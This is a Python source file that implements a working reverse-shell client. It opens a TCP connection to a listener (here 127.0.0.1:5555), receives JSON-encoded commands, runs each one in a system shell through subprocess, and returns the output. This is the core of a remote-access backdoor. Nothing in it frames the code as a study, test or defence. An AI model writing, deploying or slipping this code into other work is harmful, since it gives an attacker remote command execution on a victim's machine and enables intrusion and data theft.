import socket
import json
import subprocess

def send_data(data):
	jsondata = json.dumps(data)
	s.send(jsondata.encode())


def recv_data():
	data = ''
	while True: # Infinite loop so that we can recv more than 1024 bytes in a go.
		try:
			data = data + s.recv(1024).decode().rstrip()
			return json.loads(data) # deserializing the serialized data
		except ValueError:
			continue

def shell():
	while True:
		command = recv_data()
		if command == "quit":
			break
		execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		result = execute.stdout.read() + execute.stderr.read()
		result = result.decode()
		send_data(result)

if __name__ == "__main__":
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 5555))
	shell()
